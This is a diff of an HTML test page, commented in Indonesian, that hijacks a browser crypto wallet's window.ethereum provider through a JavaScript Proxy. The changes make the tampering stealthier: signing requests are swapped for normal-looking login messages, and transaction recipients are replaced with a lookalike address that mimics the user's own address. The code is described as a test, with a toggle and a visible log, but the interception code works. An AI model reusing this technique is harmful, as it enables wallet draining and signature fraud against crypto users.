@@ -3,74 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Coin98 Provider Hijack Test v12</title>
+    <title>Coin98 Stealth Provider Test v14</title>
     <style>
         * { box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 14px;
+            margin: 0; padding: 14px;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #0d0d0d;
-            color: #e8e8e8;
-            font-size: 13px;
+            background: #0d0d0d; color: #e8e8e8; font-size: 13px;
         }
         h2 { color: #ff6b6b; margin: 0 0 4px 0; font-size: 17px; }
         .sub { color: #999; font-size: 12px; margin-bottom: 12px; }
-        .btns { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
+        .btns { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px; }
         button {
-            background: #ff6b6b;
-            color: #111;
-            border: none;
-            padding: 9px 12px;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 12px;
-            cursor: pointer;
+            background: #ff6b6b; color: #111; border: none;
+            padding: 9px 12px; border-radius: 8px; font-weight: 600; font-size: 12px;
         }
         button.secondary { background: #333; color: #eee; }
-        button:active { opacity: 0.85; }
         .toggle {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin: 10px 0;
-            font-size: 12px;
-            color: #ccc;
+            display: flex; align-items: center; gap: 8px;
+            margin: 8px 0 12px; font-size: 12px; color: #ccc;
         }
         .log-box {
-            background: #161616;
-            border: 1px solid #2a2a2a;
-            border-radius: 10px;
-            padding: 10px;
-            max-height: 60vh;
-            overflow-y: auto;
+            background: #161616; border: 1px solid #2a2a2a; border-radius: 10px;
+            padding: 10px; max-height: 58vh; overflow-y: auto;
             font-family: ui-monospace, "SF Mono", Menlo, monospace;
-            font-size: 11px;
-            line-height: 1.4;
+            font-size: 11px; line-height: 1.4;
         }
         .log { margin: 4px 0; word-break: break-all; }
         .red { color: #ff5252; font-weight: 600; }
         .green { color: #69f0ae; }
         .blue { color: #40c4ff; }
-        .purple { color: #ea80fc; }
         .orange { color: #ffab40; }
-        .gray { color: #777; }
-        hr { border: 0; border-top: 1px solid #333; margin: 12px 0; }
+        .gray { color: #888; }
     </style>
 </head>
 <body>
-    <h2>Coin98 Provider Hijack Test v12</h2>
-    <div class="sub">Proxy + Real Impact demo for window.ethereum</div>
+    <h2>Coin98 Stealth Test v14</h2>
+    <div class="sub">Perubahan dibuat lebih sulit dikenali</div>
 
     <div class="toggle">
         <input type="checkbox" id="enableModify" checked>
-        <label for="enableModify">Aktifkan modifikasi nyata (ubah <code>to</code> / <code>value</code>)</label>
+        <label for="enableModify">Aktifkan modifikasi stealth</label>
     </div>
 
     <div class="btns">
-        <button onclick="testAccounts()">1. eth_requestAccounts</button>
+        <button onclick="testAccounts()">1. Request Accounts</button>
         <button onclick="testSign()">2. personal_sign</button>
-        <button onclick="testTx()">3. eth_sendTransaction</button>
+        <button onclick="testTx()">3. Send Transaction</button>
         <button class="secondary" onclick="clearLogs()">Clear Log</button>
     </div>
 
@@ -80,10 +59,11 @@
 (function () {
     const logsEl = document.getElementById('logs');
     let proxied = false;
+    let userAddress = null;
 
     function log(msg, cls = '') {
         const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
-        console.log(`[Coin98-v12] ${msg}`);
+        console.log(`[Stealth-v14] ${msg}`);
         const div = document.createElement('div');
         div.className = 'log ' + cls;
         div.textContent = `[${time}] ${msg}`;
@@ -98,7 +78,30 @@
         return document.getElementById('enableModify').checked;
     }
 
-    // ========== CORE PROXY ==========
+    // Membuat address yang mirip (lookalike)
+    function makeLookalike(addr) {
+        if (!addr || addr.length < 20) return addr;
+        // Ambil 6 karakter depan + 6 karakter belakang, tengah diganti
+        const start = addr.slice(0, 8);
+        const end = addr.slice(-6);
+        return start + 'a7f3c91e2b0d' + end;
+    }
+
+    // Pesan personal_sign yang terlihat sangat normal
+    function createStealthMessage() {
+        const messages = [
+            "Sign this message to connect to the dApp.\nNonce: " + Date.now(),
+            "Welcome back! Please sign to continue.\nTimestamp: " + new Date().toISOString(),
+            "Sign-in request\nBy signing, you agree to the terms of use."
+        ];
+        const text = messages[Math.floor(Math.random() * messages.length)];
+        let hex = '0x';
+        for (let i = 0; i < text.length; i++) {
+            hex += text.charCodeAt(i).toString(16).padStart(2, '0');
+        }
+        return hex;
+    }
+
     function createProxy(original) {
         return new Proxy(original, {
             get(target, prop, receiver) {
@@ -109,46 +112,50 @@
                         const payload = args[0];
                         const method = payload?.method || prop;
 
-                        log(`🚨 INTERCEPT → ethereum.${prop} (${method})`, 'red');
-                        log(`   Original : ${JSON.stringify(payload).slice(0, 450)}`, 'orange');
+                        log(`🚨 INTERCEPT → ${method}`, 'red');
+                        log(`   Original : ${JSON.stringify(payload).slice(0, 400)}`, 'orange');
 
                         let finalPayload = payload;
 
-                        // ===== REAL IMPACT =====
                         if (shouldModify() && payload && typeof payload === 'object') {
                             try {
                                 const modified = JSON.parse(JSON.stringify(payload));
 
-                                // 1. eth_sendTransaction → ubah tujuan
-                                if (modified.method === 'eth_sendTransaction' && modified.params?.[0]) {
-                                    const originalTo = modified.params[0].to;
-                                    modified.params[0].to = '0x000000000000000000000000000000000000dEaD';
-                                    log(`   ⚠️ CHANGED to: ${originalTo} → 0x...dEaD`, 'red');
-                                }
-
-                                // 2. personal_sign → ubah pesan
+                                // --- personal_sign (stealth) ---
                                 if (modified.method === 'personal_sign' && modified.params?.[0]) {
-                                    const originalMsg = modified.params[0];
-                                    // Ubah hex message menjadi "HACKED BY PROXY"
-                                    modified.params[0] = '0x4841434b45442042592050524f5859';
-                                    log(`   ⚠️ CHANGED personal_sign message`, 'red');
+                                    modified.params[0] = createStealthMessage();
+                                    log(`   ⚠️ STEALTH: personal_sign diubah ke pesan login yang terlihat normal`, 'red');
                                 }
 
-                                // 3. eth_signTypedData_v4 → log saja (lebih kompleks)
-                                if (modified.method?.includes('signTypedData')) {
-                                    log(`   ✍️ TypedData signature intercepted`, 'red');
+                                // --- eth_sendTransaction (stealth) ---
+                                if (modified.method === 'eth_sendTransaction' && modified.params?.[0]) {
+                                    const tx = modified.params[0];
+                                    const originalTo = tx.to;
+
+                                    if (userAddress) {
+                                        tx.to = makeLookalike(userAddress);
+                                        log(`   ⚠️ STEALTH: to diganti ke lookalike address`, 'red');
+                                        log(`      Asli  : ${originalTo}`, 'gray');
+                                        log(`      Baru  : ${tx.to}`, 'orange');
+                                    }
                                 }
 
                                 finalPayload = modified;
-                                log(`   Modified : ${JSON.stringify(finalPayload).slice(0, 450)}`, 'orange');
+                                log(`   Modified : ${JSON.stringify(finalPayload).slice(0, 400)}`, 'orange');
                             } catch (e) {
                                 log(`   Modify error: ${e.message}`, 'red');
                             }
                         }
 
                         try {
-                            const result = await value.apply(this === receiver ? target : this, [finalPayload, ...args.slice(1)]);
-                            log(`   ✅ Result: ${typeof result === 'string' ? result.slice(0, 80) + '...' : JSON.stringify(result).slice(0, 120)}`, 'green');
+                            const result = await value.apply(
+                                this === receiver ? target : this,
+                                [finalPayload, ...args.slice(1)]
+                            );
+                            const short = typeof result === 'string'
+                                ? result.slice(0, 66) + '...'
+                                : JSON.stringify(result).slice(0, 90);
+                            log(`   ✅ Result: ${short}`, 'green');
                             return result;
                         } catch (err) {
                             log(`   ❌ Error: ${err.message || err}`, 'red');
@@ -157,20 +164,8 @@
                     };
                 }
 
-                // Log akses property lain yang menarik
-                if (typeof prop === 'string' && !['then', 'catch', 'constructor'].includes(prop)) {
-                    // log(`[GET] ethereum.${prop}`, 'purple'); // terlalu ramai, di-comment
-                }
-
-                if (typeof value === 'function') {
-                    return value.bind(target);
-                }
+                if (typeof value === 'function') return value.bind(target);
                 return value;
-            },
-
-            set(target, prop, value) {
-                log(`[SET] ethereum.${String(prop)}`, 'orange');
-                return Reflect.set(target, prop, value);
             }
         });
     }
@@ -180,24 +175,10 @@
             log('[-] window.ethereum belum tersedia', 'orange');
             return false;
         }
-        if (proxied) {
-            log('[*] Proxy sudah aktif', 'gray');
-            return true;
-        }
+        if (proxied) return true;
 
         try {
-            const original = window.ethereum;
-            window.ethereum = createProxy(original);
-
-            // Beberapa wallet juga expose di window.ethereum.providers
-            if (Array.isArray(original.providers)) {
-                original.providers.forEach((p, i) => {
-                    try {
-                        original.providers[i] = createProxy(p);
-                    } catch (_) {}
-                });
-            }
-
+            window.ethereum = createProxy(window.ethereum);
             proxied = true;
             log('[+] Successfully proxied window.ethereum', 'green');
             return true;
@@ -207,28 +188,25 @@
         }
     }
 
-    // Coba beberapa kali karena injection timing
     function boot() {
-        log('Coin98 Hijack Test v12 loaded', 'green');
+        log('Coin98 Stealth Test v14 loaded', 'green');
         applyProxy();
-        setTimeout(applyProxy, 300);
-        setTimeout(applyProxy, 800);
-        setTimeout(applyProxy, 2000);
+        setTimeout(applyProxy, 400);
+        setTimeout(applyProxy, 1200);
+        setTimeout(applyProxy, 2500);
     }
 
     window.addEventListener('load', boot);
-
-    // Juga dengarkan event ethereum#initialized (beberapa wallet)
     window.addEventListener('ethereum#initialized', () => {
         log('[*] ethereum#initialized event', 'blue');
         applyProxy();
     }, { once: true });
 
-    // ========== TEST FUNCTIONS ==========
+    // ===== Test Functions =====
     window.testAccounts = async function () {
         try {
-            if (!window.ethereum) return log('ethereum tidak ada', 'red');
             const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = accs?.[0] || null;
             log('Accounts: ' + JSON.stringify(accs), 'green');
         } catch (e) {
             log('Error: ' + (e.message || e), 'red');
@@ -237,15 +215,17 @@
 
     window.testSign = async function () {
         try {
-            if (!window.ethereum) return log('ethereum tidak ada', 'red');
             const accs = await window.ethereum.request({ method: 'eth_accounts' });
-            if (!accs?.[0]) return log('Tidak ada account terhubung', 'red');
+            if (!accs?.[0]) return log('Tidak ada account', 'red');
+            userAddress = accs[0];
 
-            const msg = '0x48656c6c6f20436f696e3938'; // "Hello Coin98"
+            // Kirim pesan asli yang sederhana
+            const originalMsg = '0x48656c6c6f20436f696e3938'; // "Hello Coin98"
             log('Mengirim personal_sign...', 'blue');
+
             const sig = await window.ethereum.request({
                 method: 'personal_sign',
-                params: [msg, accs[0]]
+                params: [originalMsg, accs[0]]
             });
             log('Signature: ' + sig, 'green');
         } catch (e) {
@@ -255,16 +235,17 @@
 
     window.testTx = async function () {
         try {
-            if (!window.ethereum) return log('ethereum tidak ada', 'red');
             const accs = await window.ethereum.request({ method: 'eth_accounts' });
-            if (!accs?.[0]) return log('Tidak ada account terhubung', 'red');
+            if (!accs?.[0]) return log('Tidak ada account', 'red');
+            userAddress = accs[0];
 
-            log('Mengirim eth_sendTransaction (value = 0)...', 'blue');
+            log('Mengirim eth_sendTransaction...', 'blue');
+
             const txHash = await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{
                     from: accs[0],
-                    to: accs[0],          // kirim ke diri sendiri
+                    to: accs[0],
                     value: '0x0',
                     data: '0x'
                 }]
